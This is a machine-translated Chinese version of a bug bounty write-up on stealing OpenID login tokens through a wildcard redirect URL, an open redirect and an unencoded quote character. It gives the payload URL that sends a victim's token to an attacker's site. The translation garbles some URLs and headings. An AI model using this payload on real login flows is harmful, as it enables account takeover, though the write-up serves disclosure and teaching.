# 泄漏 OpenID 令牌“——就在你面前的错误

> 原文：<https://infosecwriteups.com/leaking-openid-tokens-with-the-bug-right-infront-of-you-95c1fb4a86e9?source=collection_archive---------0----------------------->

![](img/90705df34847871d46ad4c3767294ed8.png)

这只是一个简短的帖子，解释我发现的一个漏洞的细节，我相信许多研究人员在测试一个程序的登录流程时忽略了这个漏洞。这个错误可能会影响其他使用 OpenID 登录流程的网站，我建议进行测试:)(如果他们错误地配置了他们的 redirectURL 以允许* . ther domain . com/*是最好的，因为您找到开放 URL 重定向的范围会更大)

## 登录流程

所以，继续装窃听器。当登录到 redacted.com 时，它使用了一个 OpenID 系统，该系统的工作方式与 Oauth 登录流程完全相同，在 Oauth 登录流程中，它获取一个 redirectURL，并在成功登录后重定向到该 URL。随着重定向，一个令牌被发送，作为一个黑客，我想要这个令牌！

> [https://www.redacted.com/login?redirectURL=/here](https://www.redacted.com/login?redirectURL=/here)

我可以在 redirectURL 参数中输入*.redated.com，它会重定向。我很快找到了一个打开的 url 重定向，但遗憾的是，在最终重定向到我的网站时，用户登录令牌没有被附加，因为它被设置在 hashfragment 上。(#)Sadface.jpeg

我的第一个想法是，如果我用引号将它嵌套在一个参数中，会发生什么？我希望在重定向时将用户的登录令牌作为一个参数值用引号括起来。回过头来看，因为它是以 hashfragment 为背景的，我不知道我为什么会这样想。但是这表明你在黑客和测试方面永远不会出错..扔掉你想扔的东西，看看会发生什么！:)

这是一个易受攻击的 URL:

> 【https://www.redacted.com/login? redirect URL = https % 3A % 2F % 2 fevil . redated . com % 2f redirect % 3 furl % 3d https % 3A % 2F % 2 fwww . my site . com % 2F？c= "

当我测试时，这个 bug 起作用了！..但不是我期望的那样。然而，我在攻击者的网站上成功地获得了我的令牌。Happyface.jpeg

现在我只需要弄清楚是怎么发生的以及发生了什么。

当测试登录流并希望它们在成功登录后重定向到我的网站时，我将总是编码(有时是双重编码)以确保重定向时浏览器以正确的顺序解码值。**了解一个网站如何处理某些编码是很重要的**。(特别是当需要找到绕过:D 的过滤器时)

例如:下面的有效载荷不编码可能无法成功重定向到您想要的目的地(就像我说的，有时双重编码，%252F，这在您测试时会变得很明显)。

> ，[https://www.redacted.com/login?redirectURL=https](https://www.redacted.com/login?redirectURL=https%3A%2F%2Fevil.redacted.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.mysite.com%2F?c=)://evil . redc ated . com/redirect？url=https://myevilsite.com/

不管怎样，回到实际的 bug。如果你注意到我实际上留下了一个未编码的字符…引号！“—我只是在测试看看会发生什么，我可以在引用中嵌套参数，记得吗？然而，在重定向到我的网站之前，redacted.com 实际上编码为“to"——由于这个简单的编码，它使得用户的登录令牌能够通过重定向走私到我的网站。如果我使用了%22，那么就不会有令牌泄露。它必须是”——正是如此。没有引号，没有令牌泄露。

最后的有效载荷简直就是 https://www.redacted.com/login?的**T3redirect URL = https % 3A % 2F % 2 fevil . redated . com % 2f redirect % 3 furl % 3d https % 3A % 2F % 2 fwww . my site . com % 2F？c="** 当用户登录时，他们的登录令牌被发送到攻击者的服务器。同样，如果没有“，*这个 bug 就不能工作*。但是感谢”，我现在是这个用户:)

## 外卖食品

说到黑客，没有对错之分。除非你尝试，否则你怎么知道？我发现我的大多数错误都来自于手动地与功能交互并试图破坏它们，而黑客的美妙之处在于:**你可以尝试任何事情！实际上任何事情(当然是在合理的范围内…！)**

所以我们有了它，一些如此简单的东西就在每个人面前，却有着巨大的影响力。正如开篇文章中解释的，这可能会影响更多的程序，因为这是许多网站使用的非常流行的登录流程，但这也取决于网站如何处理某些字符的编码，以及他们是否错误配置了重定向 URL 等:)

快乐狩猎&黑客❤

-齐亚诺